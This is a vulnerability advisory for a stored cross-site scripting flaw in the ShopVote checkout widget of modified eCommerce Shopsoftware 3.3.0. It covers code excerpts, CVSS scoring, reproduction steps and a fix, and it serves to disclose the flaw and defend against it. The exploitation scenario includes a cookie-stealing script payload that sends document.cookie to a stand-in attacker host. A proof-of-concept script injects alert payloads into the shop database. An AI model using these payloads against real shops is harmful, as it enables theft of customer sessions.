# Stored Cross-Site Scripting in ShopVote Checkout Widget of modified eCommerce Shopsoftware

## Vulnerability Information

| Field              | Details                         |
| ------------------ | ------------------------------- |
| Advisory ID        | VULN-2026-002                   |
| CVE ID             | Pending assignment              |
| Vendor             | modified-shop                   |
| Product            | modified eCommerce Shopsoftware |
| Tested Version     | 3.3.0 (rev. 16825)              |
| Vulnerability Type | Stored Cross-Site Scripting     |
| CWE                | CWE-79                          |
| Severity           | Medium (Provisional)            |
| CVSS v3.1          | 5.4                             |
| Discovery Date     | 2026-11-18                      |
| Publication Date   | Pending                         |
| Patch Status       | No fix documented               |
| Disclosure Status  | Pending                         |

---

## 1. Executive Summary

A stored cross-site scripting (Stored XSS) vulnerability was identified in modified eCommerce Shopsoftware v3.3.0 due to improper output encoding of the `products_name` and `manufacturers_name` fields within the ShopVote review-request widget.

The vulnerability originates in `includes/extra/application_bottom/10_shopvote.php` (lines 49 and 52), where product and manufacturer names are rendered without appropriate HTML encoding through `htmlspecialchars()`. The affected widget is displayed on the order confirmation page (`checkout_success.php`) when the ShopVote module is enabled and configured.

The following code excerpts illustrate the improper handling of the affected fields:

```php
// 10_shopvote.php:49 — products_name without htmlspecialchars():
<span class="sv-i-product-name"><?php echo $item['products_name']; ?></span>

// 10_shopvote.php:52 — manufacturers_name without htmlspecialchars():
<span class="sv-i-product-brand"><?php echo $item['manufacturers_name']; ?></span>
```

Both fields are stored without HTML encoding through `xtc_db_prepare_input()`. When a customer completes a purchase, the `products_name` value is retrieved from the `orders_products` table, while the `manufacturers_name` value is retrieved directly from the `manufacturers` table. Both values are subsequently rendered within the ShopVote widget without context-appropriate output encoding.

As a result, an authenticated user with permission to modify product or manufacturer records could inject arbitrary JavaScript that is subsequently executed in the browser of customers completing purchases involving the affected products.

Successful exploitation requires the ShopVote module to be enabled and configured, as well as interaction from a customer completing the checkout process.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: includes/extra/application_bottom/10_shopvote.php:49 | rev 16825 | None | Affected |
| Component: includes/extra/application_bottom/10_shopvote.php:52 | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker), Smarty 3

---

## 3. Vulnerability Description

### Storage

```php
// admin/products.php — products_name stored without HTML encoding:
// products_description.products_name = xtc_db_prepare_input($_POST['products_name'][...])

// admin/manufacturers.php — manufacturers_name stored without HTML encoding:
// manufacturers.manufacturers_name = xtc_db_prepare_input($_POST['manufacturers_name'])
```

### Rendering — ShopVote Checkout Widget (`10_shopvote.php:21-65`)

```php
// 10_shopvote.php:21-24 — only executes on checkout_success.php:
if (basename($PHP_SELF) == FILENAME_CHECKOUT_SUCCESS
    && isset($last_order)
    && MODULE_SHOPVOTE_API_KEY != '')
{
    $item_query = xtc_db_query("SELECT op.products_name, m.manufacturers_name, ...
                                 FROM orders o
                                 JOIN orders_products op ...
                            LEFT JOIN manufacturers m ...
                                WHERE o.orders_id='".(int)$last_order."'");
    while ($item = xtc_db_fetch_array($item_query)) {
        // 10_shopvote.php:49 — products_name without htmlspecialchars():
        $data .= '<span class="sv-i-product-name">'.$item['products_name'].'</span>';
        
        // 10_shopvote.php:52 — manufacturers_name without htmlspecialchars():
        $data .= '<span class="sv-i-product-brand">'.$item['manufacturers_name'].'</span>';
    }
    echo '<div id="SHOPVOTECheckoutProducts" style="display: none;">'.$data.'</div>';
}
```

The widget div is `style="display: none;"` — its content is consumed by ShopVote's JavaScript — but `display: none` does not prevent script execution. `<script>` tags or event handlers (`onerror`, `onload`) inside these `<span>` elements execute immediately when the HTML is parsed.

### Necessary Conditions

- **Authentication:** Admin (to inject `products_name` or `manufacturers_name`) + Customer (to trigger at checkout_success.php)
- **User interaction:** Required — customer must complete a purchase
- **Attack vector:** Network

---

## 4. Impact

**Public path (CVSS 5.4):**
- Confidentiality: Low — customer session tokens, page content
- Integrity: Low — DOM manipulation on the order confirmation page
- Scope: Changed — customer browser session affected
- Note: Every customer that purchases any product whose `products_name` or whose manufacturer's `manufacturers_name` contains a payload will trigger XSS on their order confirmation page.

---

## 5. Classification

### CVSS (admin injection, public customer trigger)

- **Score:** 5.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low (admin to inject) |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE / CAPEC

- CWE-79 / CAPEC-198: Stored XSS

---

## 6. Exploitation Scenario

1. Admin edits a manufacturer and sets **Name** to `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`.
2. Any customer who buys any product of that manufacturer completes checkout.
3. `checkout_success.php` triggers `10_shopvote.php` (ShopVote module enabled).
4. `10_shopvote.php:52` echoes `$item['manufacturers_name']` without `htmlspecialchars()`.
5. The script executes immediately in the customer's browser on the order confirmation page.

---

## 7. Technical Evidence

### Affected Components

```text
Public:  includes/extra/application_bottom/10_shopvote.php:49
           echo $item['products_name']  (from orders_products.products_name, no htmlspecialchars)
         includes/extra/application_bottom/10_shopvote.php:52
           echo $item['manufacturers_name'] (from manufacturers.manufacturers_name, no htmlspecialchars)
Database tables: orders_products (products_name — copied at order time),
                 manufacturers (manufacturers_name — fetched live)
Trigger page: checkout_success.php (via application_bottom includes)
Module condition: MODULE_SHOPVOTE_STATUS == 'true' AND MODULE_SHOPVOTE_API_KEY != ''
Authentication: Admin to inject; Public customer to trigger at checkout_success.php
```

### Example Inject

```bash
# Inject into manufacturers_name
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE manufacturers SET manufacturers_name='<script>alert(document.cookie)</script>'
      WHERE manufacturers_id=1;" 2>/dev/null
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE manufacturers
      SET manufacturers_name='<script>alert(\"V66_shopvote_brand\")</script>'
      WHERE manufacturers_id=1;" 2>/dev/null

docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE products_description
      SET products_name='Hacked <img src=x onerror=alert(\"V66_shopvote_name\")>'
      WHERE products_id=1 AND language_id=2;" 2>/dev/null

echo "[*] Customer completes a purchase of product_id=1."
echo "[*] checkout_success.php fires alert via 10_shopvote.php:49,52 (ShopVote module must be enabled)."
```

---

## 9. Reproduction Steps

1. Enable the ShopVote module (Admin → Modules → ShopVote, set API key).
2. Log in as admin. Navigate to Products → Manufacturers → edit a manufacturer. Set **Name** to `<script>alert(1)</script>`. Save.
3. As a customer, add a product of that manufacturer to the cart and complete a purchase.
4. On the order confirmation page (`checkout_success.php`), `alert(1)` fires from `10_shopvote.php:52`.

---

## 10. Fix

```php
// 10_shopvote.php:49 — fix:
$data .= '<span class="sv-i-product-name">'.htmlspecialchars($item['products_name'], ENT_QUOTES, 'UTF-8').'</span>';

// 10_shopvote.php:52 — fix:
$data .= '<span class="sv-i-product-brand">'.htmlspecialchars($item['manufacturers_name'], ENT_QUOTES, 'UTF-8').'</span>';
```

---

## 11. Disclosure Timeline

| Date | Event |
|---|---|
| 18/11/2026 | Identified via code review |
| 18/11/2026 | Advisory prepared |
| pending | Vendor notified |

---

## 12. Credits

- **Researcher:** Van Alyson Dutra (@4rch30n), Marcus de Almeida (@maarckz) & Daniel Costa (@bscosta91)
- **Contact:** van.vep@gmail.com

---

## 13. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html

---

## 14. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 15. Contact

- **Email:** van.vep@gmail.com
- **Repository:** https://github.com/4RCH30N/Vuln-Research/
